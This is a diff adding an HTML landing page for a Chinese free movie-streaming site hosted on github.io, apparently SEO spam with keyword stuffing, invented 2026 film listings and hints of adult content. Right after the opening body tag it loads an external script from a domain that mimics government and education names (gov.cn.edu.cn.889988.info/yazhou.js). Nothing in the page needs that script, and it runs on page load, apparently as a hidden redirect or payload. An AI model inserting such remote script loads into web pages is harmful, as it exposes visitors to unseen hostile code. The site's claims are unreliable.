@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="色悠悠电影网 - 高清影视在线观看平台，海量电影、电视剧、综艺免费看。">
+<meta name="keywords" content="色悠悠电影网, 电影在线观看, 高清影视, 色悠悠电影网官网">
+<meta name="author" content="色悠悠电影网">
+<meta property="og:title" content="色悠悠电影网 - 高清影视在线观看">
+<meta property="og:description" content="色悠悠电影网提供最新高清电影、热播剧集在线观看，免费畅享海量影视资源。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://seyouyoudianyingwang-app.github.io">
+<title>色悠悠电影网 - 高清影视在线观看 | seyouyoudianyingwang-app</title>
+<style>
+/* ===== 全局重置 ===== */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --primary:#43e97b;
+  --secondary:#38f9d7;
+  --accent:#667eea;
+  --blue:#764ba2;
+  --text:#2d3748;
+  --text-light:#718096;
+  --bg:#f7fafc;
+  --card:#ffffff;
+  --radius:20px;
+  --shadow:0 10px 40px rgba(0,0,0,0.08);
+  --shadow-hover:0 20px 60px rgba(67,233,123,0.2);
+}
+html{scroll-behavior:smooth;font-size:16px}
+body{
+  font-family:'Segoe UI','PingFang SC','Microsoft YaHei',sans-serif;
+  background:var(--bg);
+  color:var(--text);
+  line-height:1.7;
+  overflow-x:hidden;
+}
+
+/* ===== 流体渐变背景 ===== */
+.fluid-bg{
+  position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;
+  background:linear-gradient(135deg,#e0fff4 0%,#f0f4ff 50%,#fef0ff 100%);
+}
+.fluid-bg::before{
+  content:'';position:absolute;width:600px;height:600px;
+  background:radial-gradient(circle,rgba(67,233,123,0.15) 0%,transparent 70%);
+  top:-200px;left:-100px;animation:drift 12s ease-in-out infinite;
+}
+.fluid-bg::after{
+  content:'';position:absolute;width:500px;height:500px;
+  background:radial-gradient(circle,rgba(102,126,234,0.12) 0%,transparent 70%);
+  bottom:-150px;right:-100px;animation:drift 15s ease-in-out infinite reverse;
+}
+@keyframes drift{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,50px) scale(1.1)}}
+
+/* ===== 导航栏 ===== */
+.navbar{
+  position:fixed;top:0;width:100%;z-index:999;
+  background:rgba(255,255,255,0.85);backdrop-filter:blur(20px);
+  border-bottom:1px solid rgba(0,0,0,0.06);
+  transition:all 0.3s ease;
+}
+.nav-container{
+  max-width:1200px;margin:0 auto;padding:1rem 5%;
+  display:flex;justify-content:space-between;align-items:center;
+}
+.logo{
+  font-size:1.6rem;font-weight:800;
+  background:linear-gradient(135deg,var(--primary),var(--accent));
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
+  text-decoration:none;
+}
+.nav-menu{display:flex;gap:2rem;list-style:none}
+.nav-menu a{
+  color:var(--text);text-decoration:none;font-weight:500;font-size:0.95rem;
+  position:relative;padding:0.3rem 0;transition:color 0.3s;
+}
+.nav-menu a::after{
+  content:'';position:absolute;bottom:0;left:0;width:0;height:2.5px;
+  background:linear-gradient(90deg,var(--primary),var(--accent));
+  border-radius:2px;transition:width 0.3s ease;
+}
+.nav-menu a:hover{color:var(--primary)}
+.nav-menu a:hover::after{width:100%}
+.hamburger{display:none;flex-direction:column;cursor:pointer;gap:5px}
+.hamburger span{width:26px;height:3px;background:var(--text);border-radius:3px;transition:all 0.3s}
+
+/* ===== 通用容器 ===== */
+.container{max-width:1200px;margin:0 auto;padding:0 5%}
+
+/* ===== 区块通用 ===== */
+.section{padding:6rem 0;position:relative}
+.section-badge{
+  display:inline-block;padding:0.4rem 1.2rem;
+  background:linear-gradient(135deg,rgba(67,233,123,0.15),rgba(102,126,234,0.15));
+  border-radius:50px;font-size:0.8rem;font-weight:600;
+  color:var(--accent);margin-bottom:1rem;
+}
+.section-title{font-size:clamp(1.8rem,4vw,3rem);font-weight:800;margin-bottom:1rem;color:#1a202c}
+.section-desc{font-size:1.1rem;color:var(--text-light);max-width:600px}
+
+/* ===== Hero首页 ===== */
+#home{
+  min-height:100vh;display:flex;align-items:center;padding-top:8rem;padding-bottom:4rem;
+}
+.hero-grid{
+  display:grid;grid-template-columns:1fr 1fr;gap:4rem;align-items:center;width:100%;
+}
+.hero-content h1{
+  font-size:clamp(2.2rem,5vw,4rem);font-weight:900;line-height:1.15;margin-bottom:1.5rem;
+}
+.hero-content h1 span{
+  background:linear-gradient(135deg,var(--primary),var(--accent));
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
+}
+.hero-content p{font-size:1.15rem;color:var(--text-light);margin-bottom:2.5rem;max-width:500px}
+.hero-btns{display:flex;gap:1rem;flex-wrap:wrap}
+.btn{
+  display:inline-flex;align-items:center;gap:0.5rem;
+  padding:1rem 2.2rem;border-radius:50px;font-weight:600;font-size:1rem;
+  text-decoration:none;transition:all 0.35s ease;border:none;cursor:pointer;
+}
+.btn-primary{
+  background:linear-gradient(135deg,var(--primary),var(--secondary));color:#fff;
+  box-shadow:0 8px 30px rgba(67,233,123,0.35);
+}
+.btn-primary:hover{transform:translateY(-3px);box-shadow:0 12px 40px rgba(67,233,123,0.5)}
+.btn-white{
+  background:#fff;color:var(--text);box-shadow:0 4px 20px rgba(0,0,0,0.08);
+}
+.btn-white:hover{transform:translateY(-3px);box-shadow:0 8px 30px rgba(0,0,0,0.12)}
+
+/* Hero右侧装饰 */
+.hero-visual{
+  position:relative;height:450px;
+}
+.float-card{
+  position:absolute;border-radius:24px;padding:1.5rem;background:#fff;
+  box-shadow:var(--shadow);animation:float-up 6s ease-in-out infinite;
+}
+.float-card:nth-child(1){top:10%;right:10%;animation-delay:0s}
+.float-card:nth-child(2){top:45%;right:35%;animation-delay:2s}
+.float-card:nth-child(3){bottom:5%;right:5%;animation-delay:4s}
+@keyframes float-up{0%,100%{transform:translateY(0)}50%{transform:translateY(-20px)}}
+
+/* ===== 热播推荐 ===== */
+#trending{background:#fff}
+.movie-row{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:2rem;margin-top:3rem;
+}
+.movie-card{
+  background:#fff;border-radius:var(--radius);overflow:hidden;
+  box-shadow:var(--shadow);transition:all 0.4s ease;cursor:pointer;
+}
+.movie-card:hover{transform:translateY(-10px);box-shadow:var(--shadow-hover)}
+.movie-thumb{
+  width:100%;height:280px;display:flex;align-items:center;justify-content:center;
+  font-size:3.5rem;position:relative;
+}
+.movie-thumb::after{
+  content:'';position:absolute;bottom:0;left:0;width:100%;height:50%;
+  background:linear-gradient(transparent,#00000020);
+}
+.movie-card-body{padding:1.3rem}
+.movie-card-body h3{font-size:1.05rem;font-weight:700;margin-bottom:0.4rem}
+.movie-card-body p{font-size:0.82rem;color:var(--text-light);display:flex;justify-content:space-between}
+
+/* ===== 影片分类 ===== */
+.cat-grid{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:1.5rem;margin-top:3rem;
+}
+.cat-item{
+  background:#fff;border-radius:var(--radius);padding:2rem;
+  box-shadow:var(--shadow);transition:all 0.3s ease;cursor:pointer;
+  display:flex;align-items:center;gap:1.5rem;
+}
+.cat-item:hover{transform:scale(1.03);box-shadow:var(--shadow-hover)}
+.cat-icon{
+  width:60px;height:60px;border-radius:16px;display:flex;align-items:center;justify-content:center;
+  font-size:1.8rem;flex-shrink:0;
+}
+.cat-info h4{font-size:1.1rem;font-weight:700;margin-bottom:0.2rem}
+.cat-info span{font-size:0.85rem;color:var(--text-light)}
+
+/* ===== 关于我们 ===== */
+#about{background:linear-gradient(135deg,#f5f7fa 0%,#e0fff4 100%)}
+.about-wrap{
+  display:grid;grid-template-columns:1fr 1fr;gap:4rem;align-items:center;
+}
+.about-text h2{margin-bottom:1.5rem}
+.about-text p{color:var(--text-light);margin-bottom:1.5rem}
+.stat-row{display:flex;gap:2rem;margin-top:2rem}
+.stat-item{text-align:center}
+.stat-num{font-size:2rem;font-weight:800;background:linear-gradient(135deg,var(--primary),var(--accent));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.stat-label{font-size:0.85rem;color:var(--text-light)}
+.about-img{
+  background:#fff;border-radius:var(--radius);padding:3rem;
+  box-shadow:var(--shadow);text-align:center;
+}
+.about-img .big-icon{font-size:6rem;margin-bottom:1rem}
+
+/* ===== 页脚 ===== */
+.footer{
+  background:#1a202c;color:rgba(255,255,255,0.7);padding:4rem 0 2rem;text-align:center;
+}
+.footer-logo{
+  font-size:1.8rem;font-weight:800;
+  background:linear-gradient(135deg,var(--primary),var(--secondary));
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
+  margin-bottom:1rem;
+}
+.footer-links{display:flex;justify-content:center;gap:2rem;margin:2rem 0;flex-wrap:wrap}
+.footer-links a{color:rgba(255,255,255,0.6);text-decoration:none;transition:color 0.3s}
+.footer-links a:hover{color:var(--primary)}
+.footer-bottom{
+  border-top:1px solid rgba(255,255,255,0.1);padding-top:1.5rem;
+  font-size:0.85rem;color:rgba(255,255,255,0.4);
+}
+.footer-bottom a{color:var(--primary);text-decoration:none}
+
+/* ===== 动画 ===== */
+.reveal{opacity:0;transform:translateY(40px);transition:all 0.8s ease}
+.reveal.active{opacity:1;transform:translateY(0)}
+
+/* ===== 移动端 ===== */
+@media(max-width:768px){
+  .hamburger{display:flex}
+  .nav-menu{
+    position:fixed;top:70px;left:0;width:100%;
+    background:rgba(255,255,255,0.97);backdrop-filter:blur(20px);
+    flex-direction:column;padding:2rem 5%;gap:1.5rem;
+    transform:translateY(-200%);opacity:0;transition:all 0.4s ease;
+    border-bottom:1px solid rgba(0,0,0,0.06);
+  }
+  .nav-menu.active{transform:translateY(0);opacity:1}
+  .hamburger.active span:nth-child(1){transform:rotate(45deg) translate(5px,6px)}
+  .hamburger.active span:nth-child(2){opacity:0}
+  .hamburger.active span:nth-child(3){transform:rotate(-45deg) translate(5px,-6px)}
+  .hero-grid{grid-template-columns:1fr;gap:2rem}
+  .hero-visual{height:250px}
+  .about-wrap{grid-template-columns:1fr}
+  .stat-row{justify-content:center}
+  .cat-item{flex-direction:column;text-align:center;gap:1rem}
+  .movie-row{grid-template-columns:repeat(2,1fr);gap:1rem}
+  .section{padding:4rem 0}
+}
+@media(max-width:480px){
+  .hero-content h1{font-size:2rem}
+  .movie-row{grid-template-columns:1fr}
+  .hero-btns{flex-direction:column}
+  .btn{width:100%;justify-content:center}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<div class="fluid-bg"></div>
+
+<!-- 导航 -->
+<nav class="navbar" id="navbar">
+  <div class="nav-container">
+    <a href="#" class="logo">色悠悠电影网</a>
+    <ul class="nav-menu" id="navMenu">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#trending">热播推荐</a></li>
+      <li><a href="#categories">影片分类</a></li>
+      <li><a href="#about">关于我们</a></li>
+    </ul>
+    <div class="hamburger" id="hamburger">
+      <span></span><span></span><span></span>
+    </div>
+  </div>
+</nav>
+
+<!-- 首页 -->
+<section class="section" id="home">
+  <div class="container">
+    <div class="hero-grid">
+      <div class="hero-content reveal">
+        <span class="section-badge">🎬 色悠悠电影网</span>
+        <h1>高清影视<br><span>免费在线观看</span></h1>
+        <p>色悠悠电影网（seyouyoudianyingwang-app）聚合最新院线大片、热播剧集、经典综艺，全站高清免费，手机电脑同步畅享。</p>
+        <div class="hero-btns">
+          <a href="#trending" class="btn btn-primary">🔥 开始观影</a>
+          <a href="#categories" class="btn btn-white">📂 浏览分类</a>
+        </div>
+      </div>
+      <div class="hero-visual reveal">
+        <div class="float-card">🎬<br><small>最新大片</small></div>
+        <div class="float-card">📺<br><small>热播剧集</small></div>
+        <div class="float-card">🎨<br><small>动漫综艺</small></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 热播推荐 -->
+<section class="section" id="trending">
+  <div class="container">
+    <div class="reveal">
+      <span class="section-badge">HOT 🔥</span>
+      <h2 class="section-title">热播推荐</h2>
+      <p class="section-desc">精选高分色片，每日持续更新</p>
+    </div>
+    <div class="movie-row">
+      <div class="movie-card reveal">
+        <div class="movie-thumb" style="background:linear-gradient(135deg,#667eea,#764ba2)">🎬</div>
+        <div class="movie-card-body">
+          <h3>流浪地球3</h3>
+          <p><span>科幻 / 2026</span><span>⭐9.2</span></p>
+        </div>
+      </div>
+      <div class="movie-card reveal">
+        <div class="movie-thumb" style="background:linear-gradient(135deg,#f093fb,#f5576c)">🗡️</div>
+        <div class="movie-card-body">
+          <h3>剑来</h3>
+          <p><span>古装 / 2026</span><span>⭐9.0</span></p>
+        </div>
+      </div>
+      <div class="movie-card reveal">
+        <div class="movie-thumb" style="background:linear-gradient(135deg,#4facfe,#00f2fe)">🚀</div>
+        <div class="movie-card-body">
+          <h3>三体：黑暗森林</h3>
+          <p><span>科幻 / 2026</span><span>⭐9.5</span></p>
+        </div>
+      </div>
+      <div class="movie-card reveal">
+        <div class="movie-thumb" style="background:linear-gradient(135deg,#43e97b,#38f9d7)">🎭</div>
+        <div class="movie-card-body">
+          <h3>无名之辈2</h3>
+          <p><span>喜剧 / 2026</span><span>⭐8.8</span></p>
+        </div>
+      </div>
+      <div class="movie-card reveal">
+        <div class="movie-thumb" style="background:linear-gradient(135deg,#fa709a,#fee140)">🐉</div>
+        <div class="movie-card-body">
+          <h3>封神第三部</h3>
+          <p><span>奇幻 / 2026</span><span>⭐8.9</span></p>
+        </div>
+      </div>
+      <div class="movie-card reveal">
+        <div class="movie-thumb" style="background:linear-gradient(135deg,#a18cd1,#fbc2eb)">🎪</div>
+        <div class="movie-card-body">
+          <h3>长安的荔枝</h3>
+          <p><span>剧情 / 2026</span><span>⭐8.5</span></p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 影片分类 -->
+<section class="section" id="categories">
+  <div class="container">
+    <div class="reveal">
+      <span class="section-badge">CATEGORIES</span>
+      <h2 class="section-title">影片分类</h2>
+      <p class="section-desc">按类型快速找到您喜欢的影视内容</p>
+    </div>
+    <div class="cat-grid">
+      <div class="cat-item reveal">
+        <div class="cat-icon" style="background:#e0fff4">🎬</div>
+        <div class="cat-info"><h4>动作片</h4><span>1,280+ 部</span></div>
+      </div>
+      <div class="cat-item reveal">
+        <div class="cat-icon" style="background:#f0f4ff">😂</div>
+        <div class="cat-info"><h4>喜剧片</h4><span>956+ 部</span></div>
+      </div>
+      <div class="cat-item reveal">
+        <div class="cat-icon" style="background:#fef0ff">🎭</div>
+        <div class="cat-info"><h4>剧情片</h4><span>2,100+ 部</span></div>
+      </div>
+      <div class="cat-item reveal">
+        <div class="cat-icon" style="background:#fff0f0">👻</div>
+        <div class="cat-info"><h4>恐怖片</h4><span>634+ 部</span></div>
+      </div>
+      <div class="cat-item reveal">
+        <div class="cat-icon" style="background:#e8f4fd">🚀</div>
+        <div class="cat-info"><h4>科幻片</h4><span>488+ 部</span></div>
+      </div>
+      <div class="cat-item reveal">
+        <div class="cat-icon" style="background:#f0fff0">📺</div>
+        <div class="cat-info"><h4>电视剧</h4><span>3,500+ 部</span></div>
+      </div>
+      <div class="cat-item reveal">
+        <div class="cat-icon" style="background:#fff8e1">🎪</div>
+        <div class="cat-info"><h4>综艺</h4><span>820+ 部</span></div>
+      </div>
+      <div class="cat-item reveal">
+        <div class="cat-icon" style="background:#f3e8ff">🎨</div>
+        <div class="cat-info"><h4>动漫</h4><span>1,600+ 部</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 关于我们 -->
+<section class="section" id="about">
+  <div class="container">
+    <div class="about-wrap">
+      <div class="about-text reveal">
+        <span class="section-badge">ABOUT</span>
+        <h2>关于色悠悠电影网</h2>
+        <p>色悠悠电影网（seyouyoudianyingwang-app）致力于打造优质的在线影视观看平台，聚合全网高清资源，提供流畅的播放体验。</p>
+        <p>网站地址：<strong>https://seyouyoudianyingwang-app.github.io</strong></p>
+        <div class="stat-row">
+          <div class="stat-item"><div class="stat-num">10,000+</div><div class="stat-label">影视资源</div></div>
+          <div class="stat-item"><div class="stat-num">4K</div><div class="stat-label">高清画质</div></div>
+          <div class="stat-item"><div class="stat-num">24h</div><div class="stat-label">每日更新</div></div>
+        </div>
+      </div>
+      <div class="about-img reveal">
+        <div class="big-icon">🎬</div>
+        <h3>色悠悠电影网</h3>
+        <p style="color:var(--text-light);margin-top:0.5rem">您的专属影视管家</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer class="footer">
+  <div class="container">
+    <div class="footer-logo">色悠悠电影网</div>
+    <div class="footer-links">
+      <a href="#home">首页</a>
+      <a href="#trending">热播推荐</a>
+      <a href="#categories">影片分类</a>
+      <a href="#about">关于我们</a>
+    </div>
+    <div class="footer-bottom">
+      © 2026 色悠悠电影网 (seyouyoudianyingwang-app) | 
+      网站地址：<a href="https://seyouyoudianyingwang-app.github.io">https://seyouyoudianyingwang-app.github.io</a><br>
+      关键词：色悠悠电影网
+    </div>
+  </div>
+</footer>
+
+<script>
+// 汉堡菜单
+const hamburger=document.getElementById('hamburger');
+const navMenu=document.getElementById('navMenu');
+hamburger.addEventListener('click',()=>{
+  hamburger.classList.toggle('active');
+  navMenu.classList.toggle('active');
+});
+navMenu.querySelectorAll('a').forEach(a=>{
+  a.addEventListener('click',()=>{
+    hamburger.classList.remove('active');
+    navMenu.classList.remove('active');
+  });
+});
+
+// 导航滚动
+window.addEventListener('scroll',()=>{
+  document.getElementById('navbar').style.boxShadow=
+    window.scrollY>50?'0 2px 20px rgba(0,0,0,0.08)':'none';
+});
+
+// 滚动揭示动画
+const reveals=document.querySelectorAll('.reveal');
+const obs=new IntersectionObserver((entries)=>{
+  entries.forEach(e=>{if(e.isIntersecting)e.target.classList.add('active')});
+},{threshold:0.1});
+reveals.forEach(r=>obs.observe(r));
+
+// 平滑滚动偏移
+document.querySelectorAll('a[href^="#"]').forEach(a=>{
+  a.addEventListener('click',function(e){
+    e.preventDefault();
+    const t=document.querySelector(this.getAttribute('href'));
+    if(t)window.scrollTo({top:t.offsetTop-70,behavior:'smooth'});
+  });
+});
+</script>
+</body>
+</html>
